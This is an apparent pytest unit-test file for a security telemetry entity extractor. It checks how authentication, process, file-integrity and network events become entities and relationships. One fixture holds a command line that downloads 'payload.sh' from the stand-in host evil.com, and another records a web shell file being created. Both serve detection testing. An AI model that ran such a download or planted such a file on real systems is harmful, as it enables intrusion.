"""Unit tests for entity extraction from security telemetry events."""

from datetime import datetime, timezone
from uuid import uuid4
import pytest

from waliya.contracts import EntityTypeEnum, RelationTypeEnum
from waliya.correlation.entity_extractor import EntityExtractor, is_valid_ip


def test_ip_validation():
    assert is_valid_ip("192.168.1.1") is True
    assert is_valid_ip("10.0.0.5") is True
    assert is_valid_ip("2001:db8::1") is True
    assert is_valid_ip("0.0.0.0") is False
    assert is_valid_ip("127.0.0.1") is False
    assert is_valid_ip("not_an_ip") is False
    assert is_valid_ip(None) is False
    assert is_valid_ip("") is False


def test_extract_authentication_event():
    agent_id = uuid4()
    event = {
        "event_id": str(uuid4()),
        "event_type": "AUTHENTICATION",
        "agent_id": str(agent_id),
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "source": "auth_pam",
        "attributes": {
            "user": "alice",
            "src_ip": "198.51.100.25",
            "service": "sshd",
            "status": "SUCCESS",
        },
    }

    entities, relationships = EntityExtractor.extract(event)
    entity_ids = {e.id: e for e in entities}

    # Entities: Host, User, IP
    assert f"host:{agent_id}" in entity_ids
    assert entity_ids[f"host:{agent_id}"].type == EntityTypeEnum.HOST

    assert "user:alice" in entity_ids
    assert entity_ids["user:alice"].type == EntityTypeEnum.USER
    assert entity_ids["user:alice"].label == "alice"

    assert "ip:198.51.100.25" in entity_ids
    assert entity_ids["ip:198.51.100.25"].type == EntityTypeEnum.IP_ADDRESS

    # Relationships: user -> AUTHENTICATED_TO -> host
    user_auth = next(
        r for r in relationships
        if r.source_id == "user:alice" and r.target_id == f"host:{agent_id}"
    )
    assert user_auth.relation == RelationTypeEnum.AUTHENTICATED_TO
    assert user_auth.properties["service"] == "sshd"
    assert user_auth.properties["status"] == "SUCCESS"

    # Relationship: ip -> CONNECTED_TO -> host
    ip_conn = next(
        r for r in relationships
        if r.source_id == "ip:198.51.100.25" and r.target_id == f"host:{agent_id}"
    )
    assert ip_conn.relation == RelationTypeEnum.CONNECTED_TO


def test_extract_process_execution_event():
    agent_id = uuid4()
    event = {
        "event_id": str(uuid4()),
        "event_type": "PROCESS_EXECUTION",
        "agent_id": str(agent_id),
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "source": "auditd",
        "attributes": {
            "pid": 3045,
            "ppid": 1002,
            "exe": "/usr/bin/curl",
            "username": "bob",
            "cmdline": "curl -O http://evil.com/payload.sh",
            "sha256": "abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
        },
    }

    entities, relationships = EntityExtractor.extract(event)
    entity_ids = {e.id: e for e in entities}

    proc_id = f"process:{agent_id}:3045:curl"
    parent_id = f"process:{agent_id}:1002:parent"

    assert proc_id in entity_ids
    assert entity_ids[proc_id].type == EntityTypeEnum.PROCESS
    assert entity_ids[proc_id].properties["exe"] == "/usr/bin/curl"

    assert "user:bob" in entity_ids
    assert parent_id in entity_ids

    # Relationships: Host -> SPAWNED -> Proc, User -> SPAWNED -> Proc, Parent -> SPAWNED -> Proc
    rel_map = {(r.source_id, r.target_id): r for r in relationships}
    assert (f"host:{agent_id}", proc_id) in rel_map
    assert rel_map[(f"host:{agent_id}", proc_id)].relation == RelationTypeEnum.SPAWNED

    assert ("user:bob", proc_id) in rel_map
    assert (parent_id, proc_id) in rel_map


def test_extract_file_integrity_event():
    agent_id = uuid4()
    event = {
        "event_id": str(uuid4()),
        "event_type": "FILE_INTEGRITY",
        "agent_id": str(agent_id),
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "source": "fim_ebpf",
        "attributes": {
            "file_path": "/var/www/html/shell.php",
            "action": "CREATED",
            "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
            "is_executable": True,
        },
    }

    entities, relationships = EntityExtractor.extract(event)
    file_id = f"file:{agent_id}:/var/www/html/shell.php"

    entity_ids = {e.id: e for e in entities}
    assert file_id in entity_ids
    assert entity_ids[file_id].type == EntityTypeEnum.FILE
    assert entity_ids[file_id].label == "shell.php"

    assert len(relationships) == 1
    rel = relationships[0]
    assert rel.source_id == f"host:{agent_id}"
    assert rel.target_id == file_id
    assert rel.relation == RelationTypeEnum.MODIFIED
    assert rel.properties["action"] == "CREATED"


def test_extract_network_connection_event():
    agent_id = uuid4()
    event = {
        "event_id": str(uuid4()),
        "event_type": "NETWORK_CONNECTION",
        "agent_id": str(agent_id),
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "source": "conn_tracker",
        "attributes": {
            "src_ip": "10.0.0.50",
            "dst_ip": "198.51.100.99",
            "dst_port": 443,
            "protocol": "TCP",
            "direction": "OUTBOUND",
        },
    }

    entities, relationships = EntityExtractor.extract(event)
    entity_ids = {e.id: e for e in entities}

    assert "ip:10.0.0.50" in entity_ids
    assert "ip:198.51.100.99" in entity_ids

    # Relationships: src_ip -> dst_ip, host -> dst_ip
    rel_pairs = {(r.source_id, r.target_id): r for r in relationships}
    assert ("ip:10.0.0.50", "ip:198.51.100.99") in rel_pairs
    assert rel_pairs[("ip:10.0.0.50", "ip:198.51.100.99")].relation == RelationTypeEnum.CONNECTED_TO
    assert rel_pairs[("ip:10.0.0.50", "ip:198.51.100.99")].properties["dst_port"] == 443


def test_missing_and_malformed_fields_handled_gracefully():
    """Verify missing, invalid, or partial events never crash the extractor."""
    # Empty payload
    empty_event = {"event_id": str(uuid4()), "event_type": "PROCESS_EXECUTION"}
    entities, rels = EntityExtractor.extract(empty_event)
    assert len(entities) == 0
    assert len(rels) == 0

    # Invalid PID and empty executable
    bad_proc_event = {
        "event_id": str(uuid4()),
        "event_type": "PROCESS_EXECUTION",
        "attributes": {"pid": -10, "exe": ""},
    }
    entities, rels = EntityExtractor.extract(bad_proc_event)
    assert len(entities) == 0

    # Invalid IP format
    bad_ip_event = {
        "event_id": str(uuid4()),
        "event_type": "NETWORK_CONNECTION",
        "attributes": {"src_ip": "not_an_ip", "dst_ip": "999.999.999.999"},
    }
    entities, rels = EntityExtractor.extract(bad_ip_event)
    assert len(entities) == 0
